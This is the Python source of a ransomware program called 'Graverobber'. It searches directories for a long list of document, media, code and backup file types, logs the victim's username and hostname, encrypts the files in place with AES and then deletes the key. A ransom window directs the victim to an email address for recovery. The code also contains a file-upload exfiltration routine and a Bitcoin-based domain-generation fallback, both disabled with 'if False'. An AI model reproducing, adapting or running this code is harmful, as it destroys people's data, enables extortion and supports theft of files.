# ========================================================================= #
# Graverobber v1.1.0
# * [x] Payload
#
# Author: rfpeixoto
# Source: https://github.com/rf-peixoto/Graverobber
# ========================================================================= #
import os
import sys
import base64
import secrets
import hashlib
import requests
import platform
from tkinter import *
from time import sleep
from pathlib import Path
from random import randint
from tkinter import messagebox
from AesEverywhere import aes256
from bloxplorer import bitcoin_explorer

# ========================================================================= #
# Runs on Virtual Env?:
# ========================================================================= #
def get_prefix():
    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

def runs_on_venv():
    return get_prefix() != sys.prefix

if False:
    if runs_on_venv():
        sys.exit()
# ========================================================================= #
# Try to initialize on home:
# ========================================================================= #
if False: # Disabled.
    try:
        os.chdir(str(Path.home()))
    except Exception as error:
        print(error)
    #print(os.getcwd()) # Debug

# ========================================================================= #
# Node Setup:
# ========================================================================= #
node_id = str(randint(0, 999999)).zfill(7)
node_sig = secrets.token_urlsafe(16)
if int(node_id) % 2 == 0:
    node_key = hashlib.sha256(str(node_id + "some_secret_even_seed" + node_sig).encode()).hexdigest()[24:48][::-1]
else:
    node_key = hashlib.sha256(str(node_id + "some_secret_odd_seed" + node_sig).encode()).hexdigest()[24:48][::-1]
node_key_hash = hashlib.sha256(node_key.encode()).hexdigest()
#print(node_key) # Debug

# ========================================================================= #
# General Setup:
# ========================================================================= #
class Tool:
    def __init__(self):
        self.files_found = []
        # Watch out! Do not include files that can run on your server. Ex: php, js, html...
        self.targets = ["txt", "pdf", "odt", "xls", "png", "jpg", "jpeg",
                        "epub", "mp3", "gif", "doc", "odp", "ods", "json",
                        "mp4", "avi", "md", "ogg", "m4a", "ini", "c", "cpp", "jar",
                        "rb", "java", "pl", "py", "apk", "raw", "eml", "msg", "tmp",
                        "conf", "config", "yaml", "asm", "h", "r", "m", "luac", "dat",
                        "sasf", "lua", "src", "perl", "c#", "go", "smali", "csproj",
                        "bash", "sh", "asic", "run", "vb", "vbe", "kt", "lsp", "vba",
                        "nt", "geojson", "c++", "ps1", "dev", "mk", "owl", "scala",
                        "odl", "rar", "bak", "bkp", "iso", "zip", "7z", "sbf", "old", "meta",
                        "psw", "bkf", "fbk", "xar", "moz-backup", "orig", "new", "001", "bps",
                        "img", "deleted", "eg", "ren", "undo", "ofb", "da1", "sql", "bak1", "gcb",
                        "in1", "och", "exclude", "data", "$$$", "000", "bac", "arc", "assets",
                        "resource", "resS", "info", "dll", "vdx", "cache", "csv"]
        self.password_field = "" # For the interface
        self.new_server_address = "BTC Address" # For updates
        self.loop = True

tool = Tool()

# ========================================================================= #
# Primary Server Setup:
# ========================================================================= #
post_server = "http://127.0.0.1/file_form.php"

# Prepare Server Update:
def server_update():
    tx_id = 0
    try:
        while True:
            history = bitcoin_explorer.addr.get_tx_history(tool.new_server_address)
            last_tx = history.data[tx_id]
            last_value = dict(last_tx['vout'][0])['value']
            if last_value >= 10000000:
                break
            else:
                tx_id += 1
                continue
        last_domain = hashlib.md5(str(last_value).encode()).hexdigest()[8:24]
        return "http://{0}.com/file_form.php".format(last_domain)
    except Exception as error:
        print(error)

# ========================================================================= #
# Search Files:
# ========================================================================= #
for dirpath, dirs, files in os.walk(os.getcwd()):
    for f in files:
        path = os.path.abspath(os.path.join(dirpath, f))
        f_extension = path.split('.')[-1]
        if f_extension in tool.targets:
            tool.files_found.append(path)

# ========================================================================= #
# Save Progress:
# ========================================================================= #
op_sys = platform.system()
arch = platform.architecture()
user_name = platform.os.getlogin()
network_name = platform.node()

with open("node_{0}.txt".format(node_id), "w") as fl:
    fl.write("Node ID: {0}\n".format(node_id))
    fl.write("Node Signature: {0}\n".format(node_sig))
    fl.write("[{0}@{1}]: {1} {2}\n\n".format(user_name, network_name, op_sys, arch))
    fl.write("{0} File(s) affected:\n".format(len(tool.files_found)))
    for file in tool.files_found:
        fl.write(file + "\n")

# ========================================================================= #
# Wait Server Response:
# ========================================================================= #
if False: # Disabled.
    while True:
        ping = os.system("ping -c 1 " + post_server[:-14])
        if ping == 0:
            break
        else:
            try:
                post_server = server_update()
            except Exception as error:
                sleep(3600)
                continue

# ========================================================================= #
# Upload Files Found:
# ========================================================================= #
if False: # Disabled.
    # Send Progress Log:
    try:
        progress = open("node_{0}.txt".format(node_id), "rb")
        progress_response = requests.post(post_server, files = {"fileToUpload": progress})
        progress.close()
    except Exception as error:
        print(error)
    # Send files
    for f in tool.files_found:
        tmp_data = open(f, "rb")
        try:
            tmp_response = requests.post(post_server, files = {"fileToUpload": tmp_data})
            tmp_data.close()
        except Exception as error:
            print(error)
        sleep(0.1)

# ========================================================================= #
# Encrypt:
# ========================================================================= #
for f in tool.files_found:
    try:
        # Ignore this file and progress log:
        if f != sys.argv[0] and f != "node_{0}.txt".format(node_id):
            # Read original data and encrypt:
            with open(f, "rb") as fl:
                data = fl.read()
            encoded_data = base64.b64encode(data)
            tmp_key = node_key[::-1] + f[::-1]
            encrypted_data = aes256.encrypt(encoded_data.decode(), tmp_key)
            # Overwrite data:
            with open(f, "wb") as fl:
                fl.write(encrypted_data)
    except Exception as error:
        print(error)
# All files encrypted? Delete key from memory:
del node_key

# ========================================================================= #
# Decrypt function:
# ========================================================================= #
def decrypt(key):
    for f in tool.files_found:
        try:
            # Ignore this file and progress log:
            if f != sys.argv[0] and f != "node_{0}.txt".format(node_id):
                # Read original data and decrypt:
                with open(f, "rb") as fl:
                    data = fl.read()
                tmp_key = key[::-1] + f[::-1]
                original_data = base64.b64decode(aes256.decrypt(data.decode(), tmp_key))
                # Restore file:
                with open(f, "wb") as fl:
                    fl.write(original_data)
        except Exception as error:
            print(error)

# ========================================================================= #
# Interface Setup:
# ========================================================================= #
interlude = lambda: button_clicked(entry_field)

def button_clicked(entry):
    tool.password_field = entry.get()
    pass_hash = hashlib.sha256(tool.password_field.encode()).hexdigest()
    if pass_hash == node_key_hash:
        messagebox.showinfo(title="Success!", message="Your password is correct, click \"OK\" and wait for the decryption. This may take some time.")
        try:
            decrypt(tool.password_field)
            messagebox.showinfo(title="Success!", message="Your files was restored. Thank you!")
            tool.loop = False
        except Exception as error:
            print(error)
    else:
        messagebox.showwarning(title="Wrong password.", message="Put the recovery password on the field bellow then click the button.")
        
# ========================================================================= #
# GUI:
# ========================================================================= #
window = Tk()
window.title("The Graverobber - DO NOT CLOSE THIS WINDOW!")
phrase_a = Label(window, text="You have been visited by the Graverobber. {0} file(s) are now encrypted.".format(len(tool.files_found)))
phrase_a.grid(column=0, row=0)

phrase_b = Label(window, text="Get in touch with us to get your recovery key.")
phrase_b.grid(column=0, row=1)

phrase_c = Label(window, text="Send a message to our@email.com")
phrase_c.grid(column=0, row=2)

phrase_d = Label(window, text="Node ID: {0}".format(node_id))
phrase_d.grid(column=0, row=3)

phrase_e = Label(window, text="Node Signature: {0}".format(node_sig))
phrase_e.grid(column=0, row=4)

entry_field = Entry(window, width=30)
entry_field.grid(column=0, row=5)

button = Button(window, text="Recover", command=interlude)
button.grid(column=0, row=6)

# ========================================================================= #
# Loop:
# ========================================================================= #
while tool.loop:
    window.update()
window.destroy()
